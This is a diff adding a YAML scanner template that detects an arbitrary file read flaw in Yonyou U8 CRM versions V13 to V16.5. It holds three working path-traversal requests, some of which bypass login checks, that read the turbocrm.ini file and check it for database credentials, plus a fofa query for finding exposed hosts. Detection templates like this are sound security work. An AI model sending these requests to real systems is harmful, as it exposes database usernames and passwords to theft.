@@ -1,0 +1,29 @@
+id: yonyou-u8-crm-fileread
+
+info:
+  name: 用友U8 CRM V13-V16.5系统任意文件读取
+  author: zan8in
+  severity: high
+  verified: true
+  description: |-
+    fofa: body="用友U8CRM"
+  tags: yonyou,u8,crm,fileread
+  created: 2024/06/18
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /pub/help2.php?key=/../../tsvr/turbocrm.ini
+    expression: response.status == 200 && response.body.bcontains(b'DBServer=') && response.body.bcontains(b'DBName=') && response.body.bcontains(b'DBUser=') && response.body.bcontains(b'DBPswd=')
+  r1:
+    request:
+      method: GET
+      path: /ajax/getemaildata.php?DontCheckLogin=1&filePath=../../../tsvr/turbocrm.ini
+    expression: response.status == 200 && response.body.bcontains(b'DBServer=') && response.body.bcontains(b'DBName=') && response.body.bcontains(b'DBUser=') && response.body.bcontains(b'DBPswd=')
+  r2:
+    request:
+      method: GET
+      path: /pub/downloadfile.php?DontCheckLogin=1&url=/datacache/../../../tsvr/turbocrm.ini
+    expression: response.status == 200 && response.body.bcontains(b'DBServer=') && response.body.bcontains(b'DBName=') && response.body.bcontains(b'DBUser=') && response.body.bcontains(b'DBPswd=')
+expression: r0() || r1() || r2()
